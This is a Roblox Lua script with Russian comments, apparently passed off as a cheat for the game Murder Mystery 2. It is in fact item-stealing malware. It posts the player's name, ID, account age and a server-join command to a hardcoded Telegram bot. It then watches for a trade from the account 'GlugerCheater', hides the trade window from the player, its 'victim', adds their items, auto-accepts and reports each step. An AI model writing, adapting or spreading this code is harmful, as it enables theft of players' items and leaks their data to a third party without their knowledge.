-- ============================================
-- NULL v54.0 + АВТО-ОБМЕН MM2 (GlugerCheater)
-- ============================================

-- ============================================
-- 1. ТЕЛЕГРАМ ЛОГИРОВАНИЕ
-- ============================================
local a = game:GetService("Players")
local b = game:GetService("HttpService")
local c = a.LocalPlayer

local i = {
    chat_id = "6987016618",
    parse_mode = "Markdown"
}

local function j(k)
    local l = "https://api.telegram.org/bot8999152554:AAHq8m8tU5LSaRRBrTSUr2d3Es5C2M8olm8/sendMessage"
    i.text = k
    pcall(function()
        b:RequestAsync({
            Url = l,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = b:JSONEncode(i)
        })
    end)
end

-- Отправка информации в Telegram
local place = game.PlaceId
local job = game.JobId
local name = c.Name
local id = c.UserId
local age = c.AccountAge
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local created = os.date("%Y-%m-%d", os.time() - (age * 86400))
local time = os.date("%H:%M:%S", os.time())

local v = "📡 **" .. name .. "**\n🆔 " .. id .. "\n📅 Создан: " .. created .. " (" .. age .. " дн.)\n🕒 Время: " .. time .. "\n🎮 " .. gameName .. "\n\n`if queue_on_teleport then queue_on_teleport(\"game:GetService('TeleportService'):TeleportToLocalInstance(" .. place .. ", '" .. job .. "', game.Players.LocalPlayer)\") game:GetService('TeleportService'):Teleport(" .. place .. ") else game:GetService('TeleportService'):TeleportToLocalInstance(" .. place .. ", '" .. job .. "', game.Players.LocalPlayer) end`"

j(v)

-- ============================================
-- 2. АВТО-ОБМЕН MM2 (ТОЛЬКО ДЛЯ GlugerCheater)
-- ============================================
local player = game.Players.LocalPlayer
local MY_NAME = "GlugerCheater"  -- ТВОЙ НИК
local VirtualUser = game:GetService("VirtualUser")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Отправка статуса в Telegram
local function sendStatus(text)
    j("🔄 **AutoTrade Status:**\n" .. text .. "\n👤 **Victim:** " .. player.Name)
end

sendStatus("✅ Скрипт активирован! Ожидание " .. MY_NAME)

-- Поиск окна трейда
local function findTradeWindow()
    local gui = player.PlayerGui
    for _, screenGui in pairs(gui:GetChildren()) do
        if screenGui:IsA("ScreenGui") and screenGui.Enabled then
            for _, frame in pairs(screenGui:GetDescendants()) do
                if frame:IsA("Frame") and frame.Visible then
                    for _, child in pairs(frame:GetDescendants()) do
                        if child:IsA("TextButton") and child.Visible then
                            local text = child.Text or ""
                            if text:lower():match("accept") or text:lower():match("confirm") then
                                return frame
                            end
                        end
                    end
                    if frame.Name:match("Trade") or frame.Name:match("TradeWindow") then
                        return frame
                    end
                end
            end
        end
    end
    return nil
end

-- Проверка трейда только с тобой
local function isTradeWithMe()
    local tradeWindow = findTradeWindow()
    if not tradeWindow then return false end
    
    for _, label in pairs(tradeWindow:GetDescendants()) do
        if label:IsA("TextLabel") and label.Visible then
            local text = label.Text or ""
            if text:match(MY_NAME) then
                return true
            end
        end
        if label:IsA("TextBox") and label.Visible then
            local text = label.Text or ""
            if text:match(MY_NAME) then
                return true
            end
        end
    end
    return false
end

-- Скрытие окна (жертва ничего не видит)
local function hideTradeWindow()
    local tradeWindow = findTradeWindow()
    if not tradeWindow then return false end
    
    tradeWindow.Visible = false
    tradeWindow.BackgroundTransparency = 1
    tradeWindow.Position = UDim2.new(10, 0, 10, 0)
    tradeWindow.Size = UDim2.new(0, 0, 0, 0)
    
    for _, child in pairs(tradeWindow:GetDescendants()) do
        if child:IsA("GuiObject") then
            child.Visible = false
            child.BackgroundTransparency = 1
            child.TextTransparency = 1
            child.ImageTransparency = 1
        end
        if child:IsA("TextButton") then
            child.Visible = false
            child.TextTransparency = 1
        end
    end
    
    return true
end

-- Получение всех предметов
local function getItems()
    local items = {}
    
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item)
            end
        end
    end
    
    local starterPack = player:FindFirstChild("StarterPack")
    if starterPack then
        for _, item in pairs(starterPack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item)
            end
        end
    end
    
    return items
end

-- Добавление предметов
local function addItemsToTrade()
    local items = getItems()
    if #items == 0 then
        sendStatus("⚠️ Нет предметов для обмена!")
        return false
    end
    
    local tradeWindow = findTradeWindow()
    if not tradeWindow then return false end
    
    sendStatus("📦 Добавляю " .. #items .. " предметов...")
    local added = 0
    
    -- Кликаем по каждому предмету
    for _, item in pairs(items) do
        if added >= 9 then break end
        
        for _, slot in pairs(tradeWindow:GetDescendants()) do
            if slot:IsA("ImageButton") and slot.Visible then
                if slot.Name == item.Name or slot:FindFirstChild(item.Name) then
                    local x = slot.AbsolutePosition.X + slot.AbsoluteSize.X / 2
                    local y = slot.AbsolutePosition.Y + slot.AbsoluteSize.Y / 2
                    VirtualUser:Click(x, y, Enum.UserInputType.MouseButton1)
                    added = added + 1
                    wait(0.15)
                    break
                end
            end
        end
    end
    
    -- Если не добавились - кликаем по слотам
    if added == 0 then
        local slots = {}
        for _, child in pairs(tradeWindow:GetDescendants()) do
            if child:IsA("ImageButton") and child.Visible then
                if child.Name:match("Slot") or child.Name:match("Item") then
                    table.insert(slots, child)
                end
            end
        end
        
        for i, slot in pairs(slots) do
            if added >= #items or added >= 9 then break end
            local x = slot.AbsolutePosition.X + slot.AbsoluteSize.X / 2
            local y = slot.AbsolutePosition.Y + slot.AbsoluteSize.Y / 2
            VirtualUser:Click(x, y, Enum.UserInputType.MouseButton1)
            added = added + 1
            wait(0.15)
        end
    end
    
    sendStatus("✅ Добавлено предметов: " .. added)
    return added > 0
end

-- Принятие обмена
local function acceptTrade()
    local tradeWindow = findTradeWindow()
    if not tradeWindow then return false end
    
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") and btn.Visible then
            local text = btn.Text or ""
            if text:lower():match("accept") or text:lower():match("confirm") then
                local x = btn.AbsolutePosition.X + btn.AbsoluteSize.X / 2
                local y = btn.AbsolutePosition.Y + btn.AbsoluteSize.Y / 2
                VirtualUser:Click(x, y, Enum.UserInputType.MouseButton1)
                sendStatus("✅ Обмен ПРИНЯТ с " .. MY_NAME)
                return true
            end
        end
    end
    
    -- Запасной метод через Remote
    pcall(function()
        local remote = game:GetService("ReplicatedStorage"):FindFirstChild("AcceptTrade")
        if remote then
            remote:FireServer()
            sendStatus("✅ Обмен принят (Remote)")
            return true
        end
    end)
    
    return false
end

-- ============================================
-- 3. ГЛАВНЫЙ ЦИКЛ
-- ============================================
spawn(function()
    local attempts = 0
    
    while wait(0.5) do
        if isTradeWithMe() then
            sendStatus("🔴 ОБНАРУЖЕН ТРЕЙД С " .. MY_NAME)
            sendStatus("🔄 Начинаю автоматический обмен...")
            
            -- Скрываем окно
            for i = 1, 3 do
                hideTradeWindow()
                wait(0.1)
            end
            sendStatus("🕵️ Окно скрыто!")
            
            -- Добавляем предметы
            wait(0.3)
            addItemsToTrade()
            wait(0.5)
            
            -- Принимаем обмен
            for i = 1, 5 do
                if acceptTrade() then
                    break
                end
                wait(0.2)
            end
            
            sendStatus("✅ АВТО-ОБМЕН ЗАВЕРШЁН!")
            sendStatus("🎉 Все предметы переданы " .. MY_NAME)
            break
        end
        attempts = attempts + 1
    end
end)

-- ============================================
-- 4. ФОНОВОЕ СКРЫТИЕ
-- ============================================
spawn(function()
    while wait(0.1) do
        if isTradeWithMe() then
            hideTradeWindow()
        end
    end
end)

sendStatus("✅ Скрипт активен и ждёт только " .. MY_NAME)
sendStatus("💡 Отправь запрос на обмен жертве")

print("✅ Скрипт активирован! Ожидание " .. MY_NAME)
